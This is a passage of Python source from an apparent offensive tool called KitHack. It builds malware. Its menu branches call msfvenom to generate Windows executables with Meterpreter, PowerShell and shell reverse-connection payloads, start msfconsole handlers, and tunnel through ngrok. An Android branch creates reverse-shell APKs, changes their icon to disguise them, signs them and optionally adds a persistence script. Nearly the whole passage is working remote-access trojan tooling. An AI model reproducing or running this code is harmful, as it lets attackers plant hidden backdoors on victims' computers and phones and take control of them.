				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '04':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '05':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/powershell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/powershell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/powershell_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '06':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/shell_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '07':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '08':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '09':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '10':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '11':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter/reverse_tcp_dns; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter/reverse_tcp_dns; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '12':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/metsvc_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/metsvc_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/metsvc_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '13':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/powershell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/powershell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/powershell_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '14':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/shell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/shell_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			else:
				print("\n{}[X] INVALID OPTION\n".format(RED))
				time.sleep(3)
				pause("{}Press any key to continue...".format(GREEN))
				os.system('clear')
				main()	

		elif sys == '03':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} android/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[02]{1} android/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[03]{1} android/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[04]{1} android/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[05]{1} android/shell/reverse_http'.format(WHITE, YELLOW))
			print ('{0}[06]{1} android/shell/reverse_https'.format(WHITE, YELLOW))
			print ('{0}[07]{1} android/shell/reverse_tcp'.format(WHITE, YELLOW))

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)

			if pay == '01':
				print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
				
				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
				a = a.zfill(2)
				
				if a == '01':
					run_network()
					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
						break
					else:
						Tk().withdraw()
						icon = filedialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
						print("\n{0}ICON: {1}".format(YELLOW, icon))
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))					
						mainout = os.path.splitext(OUT)[0]	
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						file = open("/tmp/data.txt", "w")
						file.write(icon + '\n')
						file.write(mainout)
						file.close()
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_http LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
						time.sleep(4)						
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/payload -o output/kithack.apk')
						location = os.getcwd()
						if os.path.isfile('output/kithack.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST: 
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()

					# Salida de bucle
					OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))					
					mainout = os.path.splitext(OUT)[0]
					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
					location = os.getcwd()
					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
						while var.upper() != "N":
							print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
							time.sleep(4)				 								
							ext = mainout + '.apk'
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
							break						
						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
						if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							if not ".tcp.ngrok.io" in LHOST:
								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
								pause("\n{}Press any key to continue...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
								pause("\n{}Press any key to continue...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
					else:
						print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
						time.sleep(3)
						pause("{}Press any key to continue...".format(GREEN))
						os.system('systemctl stop postgresql && clear')
						main()						
				
				elif a == '02':
					print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
